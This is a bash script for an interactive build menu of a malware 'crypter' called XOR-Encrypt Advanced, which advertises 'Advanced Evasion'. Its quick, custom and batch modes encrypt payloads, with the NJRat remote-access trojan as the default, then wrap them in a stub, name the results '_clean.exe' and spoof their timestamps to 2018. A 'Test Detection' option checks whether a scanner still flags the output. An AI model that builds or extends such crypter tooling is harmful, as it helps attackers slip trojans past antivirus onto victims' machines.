#!/bin/bash
# ============================================================================
# XOR-Encrypt Advanced - Interactive Build System
# Agentic CLI with animations, progress bars, and configuration management
# ============================================================================

set -e

# Color definitions
C_RESET="\033[0m"
C_RED="\033[91m"
C_GREEN="\033[92m"
C_YELLOW="\033[93m"
C_BLUE="\033[94m"
C_MAGENTA="\033[95m"
C_CYAN="\033[96m"
C_WHITE="\033[97m"
C_GRAY="\033[90m"

# Spinner frames
SPINNER="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"

# Default configuration
DEFAULT_PAYLOAD="payloads/NJRat.exe"
DEFAULT_OUTPUT="njrat_clean.exe"
DEFAULT_PASSWORD="SecureKey2026!"
DEFAULT_LEVEL="6"

# Configuration file
CONFIG_FILE="build_config.ini"

# Load configuration from file if exists
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
        DEFAULT_PAYLOAD="${PAYLOAD:-$DEFAULT_PAYLOAD}"
        DEFAULT_OUTPUT="${OUTPUT:-$DEFAULT_OUTPUT}"
        DEFAULT_PASSWORD="${PASSWORD:-$DEFAULT_PASSWORD}"
        DEFAULT_LEVEL="${LEVEL:-$DEFAULT_LEVEL}"
    fi
}

# Save configuration to file
save_config() {
    cat > "$CONFIG_FILE" << EOF
PAYLOAD="$DEFAULT_PAYLOAD"
OUTPUT="$DEFAULT_OUTPUT"
PASSWORD="$DEFAULT_PASSWORD"
LEVEL="$DEFAULT_LEVEL"
EOF
}

# Show banner
show_banner() {
    echo -e "${C_CYAN}"
    cat << 'EOF'
 ╔═══════════════════════════════════════════════════════════╗
 ║                                                           ║
 ║           XOR-ENCRYPT ADVANCED BUILD SYSTEM               ║
 ║                                                           ║
 ║     Multi-Layer Crypter | Advanced Evasion | 2026        ║
 ║                                                           ║
 ╚═══════════════════════════════════════════════════════════╝
EOF
    echo -e "${C_RESET}"
}

# Type text with animation
type_text() {
    local text="$1"
    echo -e "$text"
}

# Show spinner animation
show_spinner() {
    local duration="${1:-2}"
    local pid=$2
    local i=0
    
    if [ -n "$pid" ]; then
        while kill -0 "$pid" 2>/dev/null; do
            local frame="${SPINNER:$((i % ${#SPINNER})):1}"
            printf "\r${C_YELLOW}[%s]${C_RESET} " "$frame"
            sleep 0.1
            ((i++))
        done
    else
        for ((j=0; j<duration*10; j++)); do
            local frame="${SPINNER:$((i % ${#SPINNER})):1}"
            printf "\r${C_YELLOW}[%s]${C_RESET} " "$frame"
            sleep 0.1
            ((i++))
        done
    fi
    printf "\r"
}

# Show progress bar
show_progress_bar() {
    local task="$1"
    local step="$2"
    echo -e "${C_CYAN}[$step/3]${C_RESET} $task..."
    show_spinner 1
}

# Display current configuration
display_config() {
    echo -e "${C_WHITE}Payload:${C_RESET}    $PAYLOAD"
    echo -e "${C_WHITE}Output:${C_RESET}     $OUTPUT"
    echo -e "${C_WHITE}Password:${C_RESET}   $PASSWORD"
    echo -e "${C_WHITE}Level:${C_RESET}      $LEVEL"
}

# Display default configuration
display_defaults() {
    echo -e "${C_WHITE}Default Payload:${C_RESET}    $DEFAULT_PAYLOAD"
    echo -e "${C_WHITE}Default Output:${C_RESET}     $DEFAULT_OUTPUT"
    echo -e "${C_WHITE}Default Password:${C_RESET}   $DEFAULT_PASSWORD"
    echo -e "${C_WHITE}Default Level:${C_RESET}      $DEFAULT_LEVEL"
}

# Execute build process
execute_build() {
    echo ""
    show_progress_bar "Encrypting payload" 1
    if python3 xorcrypt_advanced.py encrypt "$PAYLOAD" temp_payload.enc -p "$PASSWORD" -l "$LEVEL" >/dev/null 2>&1; then
        echo -e "${C_GREEN}✓ Complete${C_RESET}"
    else
        echo -e "${C_RED}✗ Encryption failed${C_RESET}"
        return 1
    fi

    show_progress_bar "Generating stub" 2
    if python3 xorcrypt_advanced.py stub temp_payload.enc "build/$OUTPUT" -p "$PASSWORD" -l "$LEVEL" >/dev/null 2>&1; then
        echo -e "${C_GREEN}✓ Complete${C_RESET}"
    else
        echo -e "${C_RED}✗ Stub generation failed${C_RESET}"
        return 1
    fi

    show_progress_bar "Spoofing timestamp" 3
    if python3 metadata_spoof.py "build/$OUTPUT" "build/$OUTPUT" 2018 >/dev/null 2>&1; then
        echo -e "${C_GREEN}✓ Complete${C_RESET}"
    else
        echo -e "${C_RED}✗ Timestamp spoofing failed${C_RESET}"
        return 1
    fi

    [ -f "temp_payload.enc" ] && rm -f "temp_payload.enc"
    return 0
}

# Build complete screen
build_complete() {
    echo ""
    echo -e "${C_GRAY}═════════════════════════════════════════════════════════════${C_RESET}"
    type_text "${C_GREEN}BUILD SUCCESSFUL!${C_RESET}"
    echo -e "${C_GRAY}═════════════════════════════════════════════════════════════${C_RESET}"
    echo ""
    echo -e "${C_CYAN}Output:${C_RESET} build/$OUTPUT"
    if [ -f "build/$OUTPUT" ]; then
        local size=$(stat -f%z "build/$OUTPUT" 2>/dev/null || stat -c%s "build/$OUTPUT" 2>/dev/null)
        echo -e "${C_CYAN}Size:${C_RESET} $size bytes"
    fi
    echo ""
    read -p "Press Enter to continue..."
}

# Quick Build
quick_build() {
    clear
    show_banner
    echo ""
    type_text "${C_GREEN}QUICK BUILD MODE${C_RESET}"
    echo -e "${C_GRAY}─────────────────────────────────────────────────────────────${C_RESET}"
    echo ""

    PAYLOAD="$DEFAULT_PAYLOAD"
    OUTPUT="$DEFAULT_OUTPUT"
    PASSWORD="$DEFAULT_PASSWORD"
    LEVEL="$DEFAULT_LEVEL"

    display_config
    echo ""
    read -p "$(echo -e ${C_YELLOW}Proceed with build? \(Y/N\):${C_RESET} )" confirm
    
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        return
    fi

    if execute_build; then
        build_complete
    fi
}

# Custom Build
custom_build() {
    clear
    show_banner
    echo ""
    type_text "${C_MAGENTA}CUSTOM BUILD MODE${C_RESET}"
    echo -e "${C_GRAY}─────────────────────────────────────────────────────────────${C_RESET}"
    echo ""

    echo -e "${C_CYAN}Enter build parameters (press Enter for default):${C_RESET}"
    echo ""

    read -p "$(echo -e ${C_WHITE}Payload path [$DEFAULT_PAYLOAD]:${C_RESET} )" PAYLOAD
    PAYLOAD="${PAYLOAD:-$DEFAULT_PAYLOAD}"

    read -p "$(echo -e ${C_WHITE}Output name [$DEFAULT_OUTPUT]:${C_RESET} )" OUTPUT
    OUTPUT="${OUTPUT:-$DEFAULT_OUTPUT}"

    read -p "$(echo -e ${C_WHITE}Encryption password [$DEFAULT_PASSWORD]:${C_RESET} )" PASSWORD
    PASSWORD="${PASSWORD:-$DEFAULT_PASSWORD}"

    read -p "$(echo -e ${C_WHITE}Encryption level 1-10 [$DEFAULT_LEVEL]:${C_RESET} )" LEVEL
    LEVEL="${LEVEL:-$DEFAULT_LEVEL}"

    echo ""
    display_config
    echo ""
    read -p "$(echo -e ${C_YELLOW}Proceed with build? \(Y/N\):${C_RESET} )" confirm
    
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        return
    fi

    if execute_build; then
        build_complete
    fi
}

# Batch Build
batch_build() {
    clear
    show_banner
    echo ""
    type_text "${C_BLUE}BATCH BUILD MODE${C_RESET}"
    echo -e "${C_GRAY}─────────────────────────────────────────────────────────────${C_RESET}"
    echo ""

    echo -e "${C_CYAN}Scanning payloads directory...${C_RESET}"
    show_spinner 1

    local count=0
    local files=()
    
    if [ -d "payloads" ]; then
        while IFS= read -r file; do
            ((count++))
            files+=("$file")
            echo -e "${C_WHITE}[$count]${C_RESET} $(basename "$file")"
        done < <(find payloads -maxdepth 1 -name "*.exe" 2>/dev/null)
    fi

    if [ $count -eq 0 ]; then
        echo -e "${C_RED}No payloads found in payloads/ directory${C_RESET}"
        read -p "Press Enter to continue..."
        return
    fi

    echo ""
    read -p "$(echo -e ${C_WHITE}Encryption password [$DEFAULT_PASSWORD]:${C_RESET} )" PASSWORD
    PASSWORD="${PASSWORD:-$DEFAULT_PASSWORD}"

    read -p "$(echo -e ${C_WHITE}Encryption level 1-10 [$DEFAULT_LEVEL]:${C_RESET} )" LEVEL
    LEVEL="${LEVEL:-$DEFAULT_LEVEL}"

    echo ""
    echo -e "${C_YELLOW}Building $count payloads...${C_RESET}"
    echo ""

    local success=0
    local failed=0
    local current=0

    for file in "${files[@]}"; do
        ((current++))
        PAYLOAD="$file"
        OUTPUT="$(basename "${file%.exe}")_clean.exe"
        
        echo -e "${C_CYAN}[$current/$count] Processing $(basename "$file")...${C_RESET}"
        
        if execute_build >/dev/null 2>&1; then
            ((success++))
            echo -e "${C_GREEN}✓ Success${C_RESET}"
        else
            ((failed++))
            echo -e "${C_RED}✗ Failed${C_RESET}"
        fi
        echo ""
    done

    echo -e "${C_GRAY}─────────────────────────────────────────────────────────────${C_RESET}"
    echo -e "${C_GREEN}Successful: $success${C_RESET} | ${C_RED}Failed: $failed${C_RESET}"
    echo -e "${C_GRAY}─────────────────────────────────────────────────────────────${C_RESET}"
    read -p "Press Enter to continue..."
}

# Configure Settings
configure_settings() {
    while true; do
        clear
        show_banner
        echo ""
        type_text "${C_YELLOW}CONFIGURATION EDITOR${C_RESET}"
        echo -e "${C_GRAY}─────────────────────────────────────────────────────────────${C_RESET}"
        echo ""
        echo -e "${C_WHITE}[1]${C_RESET} Default Payload Path"
        echo -e "${C_WHITE}[2]${C_RESET} Default Output Name"
        echo -e "${C_WHITE}[3]${C_RESET} Default Password"
        echo -e "${C_WHITE}[4]${C_RESET} Default Encryption Level"
        echo -e "${C_WHITE}[5]${C_RESET} Save Configuration"
        echo -e "${C_WHITE}[6]${C_RESET} Reset to Defaults"
        echo -e "${C_WHITE}[7]${C_RESET} Back to Main Menu"
        echo -e "${C_GRAY}─────────────────────────────────────────────────────────────${C_RESET}"
        echo ""
        read -p "$(echo -e ${C_YELLOW}Select option [1-7]:${C_RESET} )" choice

        case "$choice" in
            1)
                read -p "$(echo -e ${C_WHITE}New default payload path:${C_RESET} )" DEFAULT_PAYLOAD
                ;;
            2)
                read -p "$(echo -e ${C_WHITE}New default output name:${C_RESET} )" DEFAULT_OUTPUT
                ;;
            3)
                read -p "$(echo -e ${C_WHITE}New default password:${C_RESET} )" DEFAULT_PASSWORD
                ;;
            4)
                read -p "$(echo -e ${C_WHITE}New default level \(1-10\):${C_RESET} )" DEFAULT_LEVEL
                ;;
            5)
                save_config
                echo -e "${C_GREEN}Configuration saved successfully${C_RESET}"
                sleep 2
                ;;
            6)
                DEFAULT_PAYLOAD="payloads/NJRat.exe"
                DEFAULT_OUTPUT="njrat_clean.exe"
                DEFAULT_PASSWORD="SecureKey2026!"
                DEFAULT_LEVEL="6"
                echo -e "${C_GREEN}Configuration reset to defaults${C_RESET}"
                sleep 2
                ;;
            7)
                return
                ;;
        esac
    done
}

# View Config
view_config() {
    clear
    show_banner
    echo ""
    type_text "${C_CYAN}CURRENT CONFIGURATION${C_RESET}"
    echo -e "${C_GRAY}═════════════════════════════════════════════════════════════${C_RESET}"
    display_defaults
    echo -e "${C_GRAY}═════════════════════════════════════════════════════════════${C_RESET}"
    echo ""
    read -p "Press Enter to continue..."
}

# Clean Output
clean_output() {
    clear
    show_banner
    echo ""
    type_text "${C_RED}CLEAN OUTPUT FILES${C_RESET}"
    echo -e "${C_GRAY}─────────────────────────────────────────────────────────────${C_RESET}"
    echo ""
    echo -e "${C_YELLOW}This will delete all files from:${C_RESET}"
    echo "  - build/"
    echo "  - temp files"
    echo ""
    read -p "$(echo -e ${C_RED}Are you sure? \(Y/N\):${C_RESET} )" confirm
    
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        return
    fi

    echo ""
    echo -e "${C_CYAN}Cleaning...${C_RESET}"
    show_spinner 1

    local count=0
    if [ -d "build" ]; then
        count=$(find build -name "*.exe" -type f 2>/dev/null | wc -l)
        find build -name "*.exe" -type f -delete 2>/dev/null
    fi
    [ -f "temp_payload.enc" ] && rm -f "temp_payload.enc"

    echo -e "${C_GREEN}Deleted $count files successfully${C_RESET}"
    sleep 2
}

# Test Detection
test_detection() {
    clear
    show_banner
    echo ""
    type_text "${C_MAGENTA}DETECTION TEST${C_RESET}"
    echo -e "${C_GRAY}─────────────────────────────────────────────────────────────${C_RESET}"
    echo ""

    if [ ! -f "defensive/tools/defensive_scanner.py" ]; then
        echo -e "${C_RED}Defensive scanner not found${C_RESET}"
        echo -e "${C_YELLOW}Please ensure defensive tools are installed${C_RESET}"
        read -p "Press Enter to continue..."
        return
    fi

    echo -e "${C_CYAN}Select file to scan:${C_RESET}"
    echo ""
    
    local count=0
    local files=()
    
    if [ -d "build" ]; then
        while IFS= read -r file; do
            ((count++))
            files+=("$file")
            echo -e "${C_WHITE}[$count]${C_RESET} $(basename "$file")"
        done < <(find build -maxdepth 1 -name "*.exe" 2>/dev/null)
    fi

    if [ $count -eq 0 ]; then
        echo -e "${C_RED}No files found in build/ directory${C_RESET}"
        read -p "Press Enter to continue..."
        return
    fi

    echo ""
    read -p "$(echo -e ${C_YELLOW}Select file number:${C_RESET} )" choice

    if [ "$choice" -ge 1 ] && [ "$choice" -le "$count" ]; then
        local selected="${files[$((choice-1))]}"
        echo ""
        echo -e "${C_CYAN}Scanning $(basename "$selected")...${C_RESET}"
        echo ""
        python3 defensive/tools/defensive_scanner.py "$selected"
    fi

    echo ""
    read -p "Press Enter to continue..."
}

# Show Help
show_help() {
    cat << 'EOF'

========================================
XOR-Encrypt Advanced - Interactive Build System
========================================

USAGE:
  ./build_interactive.sh [options]

OPTIONS:
  -h, --help       Show this help message
  -b, --build      Quick build with current config
  -c, --config     Configure settings
  --clean          Clean output files

INTERACTIVE MODE:
  Run without arguments to access the full menu system

EXAMPLES:
  ./build_interactive.sh
  ./build_interactive.sh --build
  ./build_interactive.sh --config

========================================
EOF
    exit 0
}

# Main Menu
show_menu() {
    while true; do
        clear
        show_banner
        echo ""
        type_text "${C_CYAN}MAIN MENU${C_RESET}"
        echo -e "${C_GRAY}─────────────────────────────────────────────────────────────${C_RESET}"
        echo -e "${C_WHITE}[1]${C_RESET} Quick Build ${C_GRAY}(Use current config)${C_RESET}"
        echo -e "${C_WHITE}[2]${C_RESET} Custom Build ${C_GRAY}(Specify parameters)${C_RESET}"
        echo -e "${C_WHITE}[3]${C_RESET} Batch Build ${C_GRAY}(Multiple payloads)${C_RESET}"
        echo -e "${C_WHITE}[4]${C_RESET} Configure Settings ${C_GRAY}(Edit defaults)${C_RESET}"
        echo -e "${C_WHITE}[5]${C_RESET} View Current Config"
        echo -e "${C_WHITE}[6]${C_RESET} Clean Output Files"
        echo -e "${C_WHITE}[7]${C_RESET} Test Detection ${C_GRAY}(Run defensive scanner)${C_RESET}"
        echo -e "${C_WHITE}[8]${C_RESET} Exit"
        echo -e "${C_GRAY}─────────────────────────────────────────────────────────────${C_RESET}"
        echo ""
        read -p "$(echo -e ${C_YELLOW}Select option [1-8]:${C_RESET} )" choice

        case "$choice" in
            1) quick_build ;;
            2) custom_build ;;
            3) batch_build ;;
            4) configure_settings ;;
            5) view_config ;;
            6) clean_output ;;
            7) test_detection ;;
            8)
                clear
                show_banner
                echo ""
                type_text "${C_YELLOW}Shutting down...${C_RESET}"
                sleep 1
                exit 0
                ;;
            *)
                echo -e "${C_RED}Invalid option${C_RESET}"
                sleep 1
                ;;
        esac
    done
}

# Main execution
load_config

# Parse command-line arguments
case "$1" in
    --help|-h)
        show_help
        ;;
    --build|-b)
        quick_build
        exit 0
        ;;
    --config|-c)
        configure_settings
        exit 0
        ;;
    --clean)
        clean_output
        exit 0
        ;;
    *)
        show_menu
        ;;
esac
